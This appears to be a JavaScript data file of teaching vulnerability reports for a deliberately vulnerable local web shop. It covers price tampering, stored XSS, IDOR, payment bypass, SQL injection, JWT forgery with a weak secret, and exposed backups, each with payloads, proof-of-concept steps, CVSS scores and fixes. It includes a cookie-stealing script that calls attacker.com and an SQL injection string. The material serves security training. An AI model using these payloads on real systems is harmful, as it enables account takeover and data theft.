export const officialReports = {
  'cart_manipulation': {
    title: "Price Tampering Vulnerability in Checkout",
    scope: "http://localhost:5173",
    endpoint: "POST /api/cart/checkout",
    type: "Business Logic Flaw / CWE-602",
    description: "A critical business logic vulnerability was found in the checkout process. The checkout endpoint blindly trusts the `unit_price` parameter sent by the client instead of validating the product's actual price against the database. This allows any registered user to purchase products at zero or negative cost.",
    payload: `POST /api/cart/checkout HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{\n  "product_id": 1,\n  "unit_price": 0,\n  "quantity": 1\n}`,
    payload_didactic: "The client-side request includes the price. Business logic should never rely on client-provided pricing data.",
    poc: [
      { step: "Add any Bugdrop to the cart." },
      { step: "Proceed to checkout and intercept the request using Burp Suite or browser DevTools." },
      { step: "Modify the `unit_price` parameter in the JSON body to `0`.", didactic: "You are overriding the visual price with a mathematically invalid one." },
      { step: "Forward the request and observe a successful purchase without charge." }
    ],
    impact: "Severe financial loss. An attacker can acquire the entire inventory without paying.",
    cvss: {
      score: "6.5",
      severity: "Medium",
      vector: "CVSS:4.0/AV:N/AC:L/PR:L/UI:N/VC:N/VI:H/VA:N",
      metrics: [
        { name: "Attack Vector (AV)", value: "Network", didactic: "Exploitable remotely over the internet." },
        { name: "Attack Complexity (AC)", value: "Low", didactic: "Requires no special conditions or race conditions." },
        { name: "Privileges Required (PR)", value: "Low", didactic: "Requires a standard customer account." },
        { name: "User Interaction (UI)", value: "None", didactic: "Can be executed entirely by the attacker." },
        { name: "Confidentiality Impact (VC)", value: "None", didactic: "No data is leaked." },
        { name: "Integrity Impact (VI)", value: "High", didactic: "Financial records and inventory are completely manipulated." },
        { name: "Availability Impact (VA)", value: "None", didactic: "The store remains online." }
      ]
    },
    remediation: "Never trust client-side prices. The backend must calculate the total cost by retrieving the `unit_price` directly from the secure database using the provided `product_id`."
  },
  'stored_xss': {
    title: "Stored Cross-Site Scripting (XSS) in Reviews",
    scope: "http://localhost:5173",
    endpoint: "POST /api/products/:id/reviews",
    type: "Injection / CWE-79",
    description: "The product reviews endpoint accepts user input and stores it directly into the database without sanitization or encoding. When other users (or an administrator) visit the product page, the malicious script is rendered and executed in their browser.",
    payload: `{"content": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>", "rating": 5}`,
    payload_didactic: "Notice the '<script>' tags. If the frontend uses dangerouslySetInnerHTML or equivalent without a library like DOMPurify, the browser will execute this payload.",
    poc: [
      { step: "Log in as a standard user." },
      { step: "Submit a review containing a JavaScript payload.", didactic: "You can use Burp Suite, Postman, or simply the UI form if it lacks frontend validation." },
      { step: "Wait for a victim to view the product page.", didactic: "When their browser loads the reviews, the script executes silently." }
    ],
    impact: "An attacker can execute arbitrary JavaScript in the victim's browser. This allows stealing session cookies, leading to full administrative account takeover.",
    cvss: {
      score: "8.0",
      severity: "High",
      vector: "CVSS:4.0/AV:N/AC:L/PR:L/UI:R/VC:H/VI:H/VA:N",
      metrics: [
        { name: "Attack Vector (AV)", value: "Network", didactic: "Exploitable over the internet." },
        { name: "Attack Complexity (AC)", value: "Low", didactic: "Very easy to execute, requires no special conditions." },
        { name: "Privileges Required (PR)", value: "Low", didactic: "Requires a standard account to post a review." },
        { name: "User Interaction (UI)", value: "Required", didactic: "The payload doesn't trigger until a victim actively visits the compromised page." },
        { name: "Confidentiality Impact (VC)", value: "High", didactic: "Allows complete theft of the session cookie." },
        { name: "Integrity Impact (VI)", value: "High", didactic: "The attacker can perform actions as the admin." },
        { name: "Availability Impact (VA)", value: "None", didactic: "Does not disrupt the service availability." }
      ]
    },
    remediation: "Never trust user input. On the backend, sanitize HTML tags or reject payloads containing scripts. On the frontend (React), rely on native text rendering ({review.content}) which auto-escapes HTML."
  },
  'idor_orders': {
    title: "Insecure Direct Object Reference (IDOR) on Orders",
    scope: "http://localhost:5173",
    endpoint: "GET /api/orders/:id",
    type: "Broken Access Control / CWE-639",
    description: "The API endpoint that retrieves order details uses a sequential numeric ID. However, the server fails to verify if the currently authenticated user actually owns the requested order. This allows any user to view any order in the system by enumerating the ID.",
    payload: `GET /api/orders/1 HTTP/1.1\nHost: localhost:3000\nAuthorization: Bearer <your_low_privilege_token>`,
    payload_didactic: "Changing the ID in the URL is the core of an IDOR attack. The attacker is requesting order #1, which belongs to the Admin.",
    poc: [
      { step: "Log in as a standard collector." },
      { step: "Navigate to your own orders page and inspect the network request (e.g., /api/orders/42)." },
      { step: "Replay the request changing the ID to 1.", didactic: "Use intercept tools to bypass the UI constraints." },
      { step: "Observe the response containing sensitive Admin data." }
    ],
    impact: "Total breach of data confidentiality. Attackers can scrape all customer orders, viewing PII, addresses, and sensitive operational data.",
    cvss: {
      score: "5.3",
      severity: "Medium",
      vector: "CVSS:4.0/AV:N/AC:L/PR:L/UI:N/VC:H/VI:N/VA:N",
      metrics: [
        { name: "Attack Vector (AV)", value: "Network", didactic: "The API is exposed publicly over the internet." },
        { name: "Attack Complexity (AC)", value: "Low", didactic: "Exploiting this only requires changing a single number in the URL." },
        { name: "Privileges Required (PR)", value: "Low", didactic: "The attacker needs a basic authenticated account to access the endpoint." },
        { name: "User Interaction (UI)", value: "None", didactic: "The attacker executes this directly without tricking any victim." },
        { name: "Confidentiality Impact (VC)", value: "High", didactic: "Returns all sensitive PII and order details for any user." },
        { name: "Integrity Impact (VI)", value: "None", didactic: "This specific endpoint only reads data, it doesn't modify the order." },
        { name: "Availability Impact (VA)", value: "None", didactic: "Does not crash or affect the server's availability." }
      ]
    },
    remediation: "Implement authorization checks on the backend. When fetching order details, ensure the `user_id` of the requested order matches the `id` of the authenticated user making the request."
  },
  'payment_bypass': {
    title: "Client-Side Payment Status Bypass",
    scope: "http://localhost:5173",
    endpoint: "POST /api/orders/:id/pay",
    type: "Business Logic Flaw / CWE-290",
    description: "The application relies entirely on the client-side to report whether a payment was successful. The backend accepts a JSON payload containing `status: success` without cross-verifying the transaction with a secure payment gateway (like Stripe or PayPal) via webhooks.",
    payload: `{"status": "success", "transaction_id": "fake_123"}`,
    payload_didactic: "The backend takes this JSON at face value. A real payment gateway integration uses secure backend-to-backend communication (Webhooks) that the user cannot spoof.",
    poc: [
      { step: "Proceed to the payment page for an existing order." },
      { step: "Intercept the final 'confirm payment' API call.", didactic: "The browser sends the success message, not the bank." },
      { step: "Modify the payload to assert a successful transaction." },
      { step: "The order is marked as paid." }
    ],
    impact: "Severe financial loss. Users can bypass the payment gateway and receive products without spending money.",
    cvss: {
      score: "6.5",
      severity: "Medium",
      vector: "CVSS:4.0/AV:N/AC:L/PR:L/UI:N/VC:N/VI:H/VA:N",
      metrics: [
        { name: "Attack Vector (AV)", value: "Network", didactic: "Exploitable remotely." },
        { name: "Attack Complexity (AC)", value: "Low", didactic: "Requires just intercepting a JSON payload and changing one string." },
        { name: "Privileges Required (PR)", value: "Low", didactic: "Requires a basic customer account to initiate an order." },
        { name: "User Interaction (UI)", value: "None", didactic: "Fully automated by the attacker." },
        { name: "Confidentiality Impact (VC)", value: "None", didactic: "Does not expose extra data." },
        { name: "Integrity Impact (VI)", value: "High", didactic: "Modifies the financial state of the order maliciously." },
        { name: "Availability Impact (VA)", value: "None", didactic: "Server keeps running smoothly." }
      ]
    },
    remediation: "Never trust the client to confirm payment success. The client should only initiate the payment. The backend must listen for secure Webhooks from the payment provider to update the order status."
  },
  'sqli_newsletter': {
    title: "SQL Injection in Newsletter Subscription",
    scope: "http://localhost:5173",
    endpoint: "POST /api/newsletter/subscribe",
    type: "Injection (SQLi) / CWE-89",
    description: "The newsletter subscription endpoint concatenates user input directly into a raw SQL query instead of using parameterized queries. By bypassing frontend HTML5 email validation, an attacker can inject SQL syntax to extract sensitive data or manipulate the database.",
    payload: `{"email": "admin' OR 1=1; -- "}`,
    payload_didactic: "The single quote (') breaks out of the expected string. The OR 1=1 makes the condition always true, and the '--' comments out the rest of the original query.",
    poc: [
      { step: "Locate the newsletter subscription form." },
      { step: "Change the HTML input type from 'email' to 'text' using DevTools.", didactic: "This bypasses the browser's basic validation preventing symbols." },
      { step: "Enter an SQL injection payload." },
      { step: "Observe the backend returning unauthorized data." }
    ],
    impact: "Data exposure, database modification, and potential Remote Code Execution depending on the database engine privileges.",
    cvss: {
      score: "9.3",
      severity: "Critical",
      vector: "CVSS:4.0/AV:N/AC:L/PR:N/UI:N/VC:H/VI:H/VA:L",
      metrics: [
        { name: "Attack Vector (AV)", value: "Network", didactic: "Public endpoint accessible over HTTP." },
        { name: "Attack Complexity (AC)", value: "Low", didactic: "Standard automated SQL injection payloads work instantly." },
        { name: "Privileges Required (PR)", value: "None", didactic: "The newsletter form is public, no login required." },
        { name: "User Interaction (UI)", value: "None", didactic: "Attacker executes it directly." },
        { name: "Confidentiality Impact (VC)", value: "High", didactic: "Can extract the entire database including passwords." },
        { name: "Integrity Impact (VI)", value: "High", didactic: "Can modify or delete any database table via stacked queries." },
        { name: "Availability Impact (VA)", value: "Low", didactic: "Heavy UNION queries could slightly degrade performance." }
      ]
    },
    remediation: "Always use Parameterized Queries (Prepared Statements) or an ORM. Never concatenate user input directly into SQL strings."
  },
  'admin_panel': {
    title: "Broken Access Control & Weak Cryptography",
    scope: "http://localhost:5173",
    endpoint: "GET /admin",
    type: "Broken Access Control / CWE-284",
    description: "The application relies on JSON Web Tokens (JWT) for authentication, but uses an extremely weak, guessable secret key ('123456'). This allows an attacker to forge a valid administrative token offline and access the hidden admin panel.",
    payload: `HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode({"id":1, "role":"admin"}),
  "123456"
)`,
    payload_didactic: "Because the secret is known (or easily cracked using tools like Hashcat), the attacker can generate a mathematically valid token that the server completely trusts.",
    poc: [
      { step: "Extract a JWT from your own normal session." },
      { step: "Crack the JWT signature offline using Hashcat or John the Ripper to reveal the weak secret.", didactic: "A 6-character number takes milliseconds to crack." },
      { step: "Forge a new JWT changing the 'role' claim to 'admin'." },
      { step: "Inject the new token into your browser cookies and navigate to /admin." }
    ],
    impact: "Complete platform takeover. The attacker gains full administrative rights to the system.",
    cvss: {
      score: "10.0",
      severity: "Critical",
      vector: "CVSS:4.0/AV:N/AC:L/PR:N/UI:N/VC:H/VI:H/VA:H",
      metrics: [
        { name: "Attack Vector (AV)", value: "Network", didactic: "API is accessible remotely." },
        { name: "Attack Complexity (AC)", value: "Low", didactic: "Offline cracking of '123456' takes less than a second." },
        { name: "Privileges Required (PR)", value: "None", didactic: "The attacker forges their own admin privileges from scratch." },
        { name: "User Interaction (UI)", value: "None", didactic: "No victim interaction required." },
        { name: "Confidentiality Impact (VC)", value: "High", didactic: "Full access to all system data." },
        { name: "Integrity Impact (VI)", value: "High", didactic: "Can alter any system configuration, orders, or users." },
        { name: "Availability Impact (VA)", value: "High", didactic: "Can delete the platform entirely or disable all users." }
      ]
    },
    remediation: "Use a cryptographically strong, randomly generated secret key (at least 256 bits) for signing JWTs. Store the secret securely in environment variables, never in source code."
  },
  'info_disclosure': {
    title: "Information Disclosure (Hidden Backups)",
    scope: "http://localhost:5173",
    endpoint: "GET /backup.bak",
    type: "Information Disclosure / CWE-538",
    description: "Developers often leave sensitive files (like database backups, source code, or configuration files) in publicly accessible directories by mistake during deployments. By performing directory enumeration, an attacker can discover and download these files.",
    payload: `GET /backup.bak HTTP/1.1\nHost: localhost:5173`,
    payload_didactic: "This isn't a complex injection; it's just asking the server if a file exists. If the server is misconfigured, it will serve the file directly.",
    poc: [
      { step: "Run a directory fuzzing tool like Gobuster or ffuf against the web server.", didactic: "Example: gobuster dir -u http://localhost:5173 -w common.txt" },
      { step: "Identify HTTP 200 OK responses for unexpected files like /backup.bak or /.git/." },
      { step: "Download the file.", didactic: "Usually contains database dumps or source code." },
      { step: "Extract sensitive credentials or hardcoded secrets from the backup." }
    ],
    impact: "Moderate to Critical. Depending on the backup contents, it could lead to total database compromise (if SQL dumps are present) or source code theft.",
    cvss: {
      score: "5.3",
      severity: "Medium",
      vector: "CVSS:4.0/AV:N/AC:L/PR:N/UI:N/VC:L/VI:N/VA:N",
      metrics: [
        { name: "Attack Vector (AV)", value: "Network", didactic: "Accessible to anyone on the internet." },
        { name: "Attack Complexity (AC)", value: "Low", didactic: "Requires no special exploits, just guessing a URL." },
        { name: "Privileges Required (PR)", value: "None", didactic: "The file is completely public." },
        { name: "User Interaction (UI)", value: "None", didactic: "No user interaction is required." },
        { name: "Confidentiality Impact (VC)", value: "Low", didactic: "Exposes internal system structure and historical data. (Could be High if passwords are in it)." },
        { name: "Integrity Impact (VI)", value: "None", didactic: "Does not modify any live data." },
        { name: "Availability Impact (VA)", value: "None", didactic: "Does not disrupt the service." }
      ]
    },
    remediation: "Ensure the web server root only contains public assets. Sensitive files, backups, and Git directories must be kept outside the web root or explicitly blocked via server configuration (e.g., Nginx deny all rules)."
  }
};
